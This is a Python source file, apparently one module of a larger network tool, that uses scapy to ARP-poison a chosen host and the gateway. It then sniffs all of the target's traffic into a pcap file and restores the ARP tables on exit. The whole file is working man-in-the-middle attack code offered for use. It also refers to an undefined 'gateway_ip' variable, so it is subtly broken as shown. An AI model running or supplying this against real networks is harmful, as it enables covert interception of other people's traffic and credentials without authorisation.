from scapy.all import *
import os
import signal
import sys
import threading
import time
import Net_Controller
import Net_Utils

gateway = Net_Utils.def_gateway()
target_ip = Net_Controller.selectedHost
conf.iface = Net_Controller.selectedInterface
conf.verb = 0

#Resolve the MAC for an IP, braodcast the fake request and wait for a reply
def get_mac(ip_address):
    #Build request and send a test packet.
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#Send the target's traffic back to the router
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    os.system("sysctl -w net.inet.ip.forwarding=0") # Disable IP forwarding
    os.kill(os.getpid(), signal.SIGTERM) # Kill the process

# Force the target to send its traffic to us, and then the router
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    try:
        while Net_Controller.isSpoofRunning:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)) #Swapped so the target still recieves what they requested
            time.sleep(2)
    except KeyboardInterrupt:
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


def spoof():
    gateway_mac = get_mac(Net_Utils.def_gateway())
    target_mac = get_mac(target_ip)

    poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        sniff_filter = "ip host " + target_ip
        packets = sniff(filter=sniff_filter, iface=conf.iface)
        wrpcap(target_ip + "_capture.pcap", packets)
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
